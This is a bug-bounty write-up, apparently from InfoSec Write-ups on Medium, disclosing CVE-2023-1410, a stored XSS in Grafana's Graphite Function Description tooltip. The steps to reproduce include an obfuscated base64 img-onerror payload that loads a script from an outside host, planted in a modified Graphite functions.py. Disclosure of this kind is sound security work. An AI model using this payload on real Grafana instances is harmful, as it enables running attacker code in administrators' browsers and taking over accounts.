---
title: CVE-2023–1410 : Stored XSS in the Graphite Function Description tooltip
url: https://infosecwriteups.com/cve-2023-1410-stored-xss-in-the-graphite-function-description-tooltip-165bdc32154c?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2023-03-27
fetch_date: 2025-10-04T10:46:18.229700
---

# CVE-2023–1410 : Stored XSS in the Graphite Function Description tooltip

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F165bdc32154c&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fcve-2023-1410-stored-xss-in-the-graphite-function-description-tooltip-165bdc32154c&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fcve-2023-1410-stored-xss-in-the-graphite-function-description-tooltip-165bdc32154c&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-165bdc32154c---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-165bdc32154c---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# CVE-2023–1410 : Stored XSS in the Graphite Function Description tooltip

[![Aswin KV](https://miro.medium.com/v2/resize:fill:64:64/1*FRePVrXU-ZBSpzBlr5sBvg.jpeg)](https://45w1nkv.medium.com/?source=post_page---byline--165bdc32154c---------------------------------------)

[Aswin KV](https://45w1nkv.medium.com/?source=post_page---byline--165bdc32154c---------------------------------------)

3 min read

·

Mar 25, 2023

--

Listen

Share

Hello everyone, Do you know about Graphite, a popular tool for monitoring metrics?

If that’s the case, you’re probably also familiar with the Function Description tooltip, which gives useful information about various functions that may be used to edit metrics data.

Press enter or click to view image in full size

![]()

Nevertheless, you may be unaware that this seemingly harmless tooltip is actually a good target for a potentially deadly sort of online vulnerability known as stored cross-site scripting (XSS).

Attackers in this circumstance can insert malicious code into the FunctionDescription tooltip, possibly allowing them to steal sensitive information or take control of user accounts.

In this post, we’ll look at the hazards posed by stored XSS in Graphite’s FunctionDescription tooltip and how to avoid such attacks.

## Summary:

When a Graphite data source is installed, this data source may be used in a dashboard.This has the ability to utilise Functions.When a function is chosen, a little tooltip will appear when you hover your mouse over the function’s name.

This tooltip will allow you to remove the chosen Function from your query or see the Function Description.Nevertheless, no sanitization is performed while adding this description to the DOM.

Because connecting to public data sources is relatively prevalent, an attacker may host a Graphite instance with changed Function Descriptions carrying XSS payloads.

When the user uses it in a query and unintentionally hovers over the Function Description, an attacker-controlled XSS payload is executed.
This may be used to make the attacker an administrator, for example.

### Steps To Reproduce:

1. Create your own own Graphite instance. I did this by running

```
make devenv sources=graphite
```

2. Now launch your Graphite container’s console and change the following file.

```
/opt/graphite/webapp/graphite/render/functions.py
```

3. You may use any function, however I choose the `aggregateSeriesLists` function.

4. Change its description to:

```
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>
```

5. The outcome would be as follows:

```
def aggregateSeriesLists(requestContext, seriesListFirstPos, seriesListSecondPos, func, xFilesFactor=None):
  """

  "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>

  """
  if len(seriesListFirstPos) != len(seriesListSecondPos):
    raise InputParameterError(
      "seriesListFirstPos and seriesListSecondPos argument must have equal length")
  results = []

  for i in range(0, len(seriesListFirstPos)):
    firstSeries = seriesListFirstPos[i]
    secondSeries = seriesListSecondPos[i]
    aggregated = aggregate(requestContext, (firstSeries, secondSeries), func, xFilesFactor=xFilesFactor)
    if not aggregated: # empty list, no data found
      continue
    result = aggregated[0]  # aggregate() can only return len 1 list
    result.name = result.name[:result.name.find('Series(')] + 'Series(%s,%s)' % (firstSeries.name, secondSeries.name)
    results.append(result)
  return results

aggregateSeriesLists.group = 'Combine'
aggregateSeriesLists.params = [
  Param('seriesListFirstPos', ParamTypes.seriesList, required=True),
  Param('seriesListSecondPos', ParamTypes.seriesList, required=True),
  Param('func', ParamTypes.aggFunc, required=True),
  Param('xFilesFactor', ParamTypes.float),
]
```

6. Save and exit the file.Restart your Graphite Container.

7. Log in as an Organization Admin to your Grafana instance.

8. Navigate to http://[grafana]/plugins/graphite and click `Create a Graphite data source`

9. Enter the url of the attacker’s Graphite instance (you may want to activate Skip SSL Check), then click Save & Test and Explore.

10. Click the Add icon next to Functions on the newly opened page, then search for aggregateSeriesLists and click it to add it.

11.Hover your cursor above aggregateSeriesLists and then move it to the? icon.

payload will be triggered, and in this case, it will include an external script that will cause the alerts to be triggered.

Press enter or click to view image in full size

![]()

Stored XSS in the Graphite Function Description tooltip

## Impact:

Of course, the attacker would increase the chance by replacing all of its descriptions with XSS payloads.
As seen above, the attacker may now execute arbitrary Javascript in the victim’s browser.

The victim can be any user, including the Organization Admin, who uses the malicious Graphite instance in a query (or while Exploring).
If this is the case, an attacker might insert a payload that allows them to be added as an administrator themself.

[Grafana](https://medium.com/tag/grafana?source=post_page-----165bdc32154c---------------------------------------)

[Cve 2023 1410](https://medium.com/tag/cve-2023-1410?source=post_page-----165bdc32154c---------------------------------------)

[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page-----165bdc32154c---------------------------------------)

[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----165bdc32154c---------------------------------------)

[Technology](https://medium.com/tag/technology?source=post_page-----165bdc32154c---------------------------------------)

--

--

[![InfoSec Write-ups...